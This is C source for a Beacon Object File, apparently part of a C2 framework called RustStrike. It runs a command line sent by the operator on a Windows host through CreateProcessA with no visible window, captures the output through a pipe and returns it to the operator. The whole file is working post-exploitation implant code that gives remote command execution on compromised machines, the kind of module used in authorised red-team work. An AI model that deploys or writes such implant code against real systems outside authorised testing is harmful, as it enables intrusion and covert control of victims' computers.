/*
 * winapi_exec BOF for RustStrike — run an executable DIRECTLY via CreateProcessA
 * (no cmd.exe / powershell.exe shell wrapper). The "Windows API 调用执行" mode.
 *
 *   args: the command line as RAW text (no length prefix), e.g.
 *   "whoami.exe", "ipconfig /all", "C:\\Windows\\System32\\notepad.exe".
 *   The Terminal sends exactly Array.from(new TextEncoder().encode(cmd)).
 *
 * Unlike cmd_exec (which runs `cmd.exe /c <cmd>`) and powershell_exec (which
 * runs `powershell.exe -Command <script>`), this passes the typed line straight
 * to CreateProcessA(NULL, <cmdline>, ...). Windows parses the executable from
 * the first token (with its own quoting rules — the first whitespace-delimited
 * token is the exe; pass a full path if the exe isn't on PATH). Captures the
 * child's stdout+stderr via a redirected pipe and converts the console
 * codepage (OEM/ACP, e.g. GBK/CP936) to UTF-8 before returning.
 *
 * Use this to run binaries cleanly without a shell: whoami, ipconfig, hostname,
 * tasklist, or arbitrary tools. For shell features (pipes `|`, redirects `>`,
 * builtins like `dir`/`echo`) use cmd_exec instead — those need cmd.exe.
 *
 * Build (mingw):
 *   gcc -c examples/winapi_exec.c -o examples/winapi_exec.x64.o
 */
#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR,
    LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, WINBOOL, DWORD, LPVOID,
    LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$CreatePipe(PHANDLE, PHANDLE,
    LPSECURITY_ATTRIBUTES, DWORD);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$SetHandleInformation(HANDLE, DWORD, DWORD);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD,
    LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$GetExitCodeProcess(HANDLE, LPDWORD);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT int WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCSTR, int, LPWSTR, int);
DECLSPEC_IMPORT int WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);
DECLSPEC_IMPORT int __cdecl MSVCRT$_snprintf(char *, size_t, const char *, ...);

#define BUF_SIZE 65536

void go(char *args, int alen) {
    char cmd[1024];
    int clen = alen < (int)sizeof(cmd) - 1 ? alen : (int)sizeof(cmd) - 1;
    if (clen <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "winapi_exec: no command specified");
        return;
    }
    for (int i = 0; i < clen; i++) cmd[i] = args[i];
    cmd[clen] = 0;
    while (clen > 0 && (cmd[clen - 1] == '\n' || cmd[clen - 1] == '\r')) {
        cmd[--clen] = 0;
    }
    if (clen == 0) {
        BeaconPrintf(CALLBACK_ERROR, "winapi_exec: no command specified");
        return;
    }

    /* CreateProcessA may modify the command line, so copy it into a writable
     * buffer (it's already `cmd`, but keep a separate writable copy to be
     * safe and to leave `cmd` intact for the banner). */
    char cmdline[1024];
    MSVCRT$_snprintf(cmdline, sizeof(cmdline), "%s", cmd);
    cmdline[sizeof(cmdline) - 1] = 0;

    HANDLE heap = KERNEL32$GetProcessHeap();
    char *buf = (char *) KERNEL32$HeapAlloc(heap, 0, BUF_SIZE);
    if (!buf) { BeaconPrintf(CALLBACK_ERROR, "winapi_exec: out of memory"); return; }
    for (int i = 0; i < BUF_SIZE; i++) buf[i] = 0;

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    HANDLE hRead = NULL, hWrite = NULL;
    if (!KERNEL32$CreatePipe(&hRead, &hWrite, &sa, 0)) {
        BeaconPrintf(CALLBACK_ERROR, "winapi_exec: CreatePipe failed (%lu)",
                     KERNEL32$GetLastError());
        KERNEL32$HeapFree(heap, 0, buf);
        return;
    }
    KERNEL32$SetHandleInformation(hRead, 0x00000001 /*HANDLE_FLAG_INHERIT*/, 0);

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = 0x00000100 /*STARTF_USESTDHANDLES*/;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.hStdInput = NULL;
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    /* Launch the typed line directly — no shell. CREATE_NO_WINDOW so the child
     * doesn't pop a console. */
    if (!KERNEL32$CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
            0x08000000 /*CREATE_NO_WINDOW*/, NULL, NULL, &si, &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "winapi_exec: CreateProcessA failed (%lu) for %s",
                     KERNEL32$GetLastError(), cmd);
        KERNEL32$CloseHandle(hRead);
        KERNEL32$CloseHandle(hWrite);
        KERNEL32$HeapFree(heap, 0, buf);
        return;
    }
    KERNEL32$CloseHandle(hWrite);

    DWORD total = 0, got = 0;
    while (KERNEL32$ReadFile(hRead, buf + total, BUF_SIZE - 1 - total, &got, NULL) && got > 0) {
        total += got;
        if (total >= BUF_SIZE - 1) break;
    }
    buf[total] = 0;

    KERNEL32$WaitForSingleObject(pi.hProcess, 0xFFFFFFFF /*INFINITE*/);
    DWORD exitcode = 0;
    KERNEL32$GetExitCodeProcess(pi.hProcess, &exitcode);

    /* Build the output: a one-line banner naming the command + exit code, then
     * the captured output. The banner helps the operator tell modes apart in
     * the terminal log. */
    char banner[1100];
    int blen = MSVCRT$_snprintf(banner, sizeof(banner) - 1, "winapi_exec: %s (exit %lu)\r\n",
                                cmd, exitcode);
    banner[sizeof(banner) - 1] = 0;
    if (blen < 0) blen = 0;

    if (total > 0) {
        /* Convert the console codepage (OEM/ACP) to UTF-8 — same path as
         * cmd_exec.c. Fall back to raw bytes if conversion fails. */
        int wlen = KERNEL32$MultiByteToWideChar(0 /*CP_ACP*/, 0, buf, (int)total, NULL, 0);
        if (wlen > 0) {
            wchar_t *wbuf = (wchar_t *) KERNEL32$HeapAlloc(heap, 0, (wlen + 1) * 2);
            if (wbuf) {
                KERNEL32$MultiByteToWideChar(0, 0, buf, (int)total, wbuf, wlen);
                int ulen = KERNEL32$WideCharToMultiByte(65001 /*CP_UTF8*/, 0,
                    wbuf, wlen, NULL, 0, NULL, NULL);
                if (ulen > 0) {
                    /* banner + utf8 body in one buffer for a single BeaconOutput */
                    char *out = (char *) KERNEL32$HeapAlloc(heap, 0, blen + ulen + 1);
                    if (out) {
                        for (int i = 0; i < blen; i++) out[i] = banner[i];
                        KERNEL32$WideCharToMultiByte(65001, 0, wbuf, wlen, out + blen, ulen, NULL, NULL);
                        out[blen + ulen] = 0;
                        BeaconOutput(CALLBACK_OUTPUT, out, blen + ulen);
                        KERNEL32$HeapFree(heap, 0, out);
                        KERNEL32$HeapFree(heap, 0, wbuf);
                        KERNEL32$CloseHandle(hRead);
                        KERNEL32$CloseHandle(pi.hProcess);
                        KERNEL32$CloseHandle(pi.hThread);
                        KERNEL32$HeapFree(heap, 0, buf);
                        return;
                    }
                }
                KERNEL32$HeapFree(heap, 0, wbuf);
            }
        }
        /* Conversion failed — emit banner + raw bytes. */
        char *out = (char *) KERNEL32$HeapAlloc(heap, 0, blen + total + 1);
        if (out) {
            for (int i = 0; i < blen; i++) out[i] = banner[i];
            for (int i = 0; i < (int)total; i++) out[blen + i] = buf[i];
            out[blen + total] = 0;
            BeaconOutput(CALLBACK_OUTPUT, out, blen + (int)total);
            KERNEL32$HeapFree(heap, 0, out);
        } else {
            BeaconOutput(CALLBACK_OUTPUT, buf, (int)total);
        }
    } else {
        BeaconOutput(CALLBACK_OUTPUT, banner, blen);
    }

    KERNEL32$CloseHandle(hRead);
    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);
    KERNEL32$HeapFree(heap, 0, buf);
}
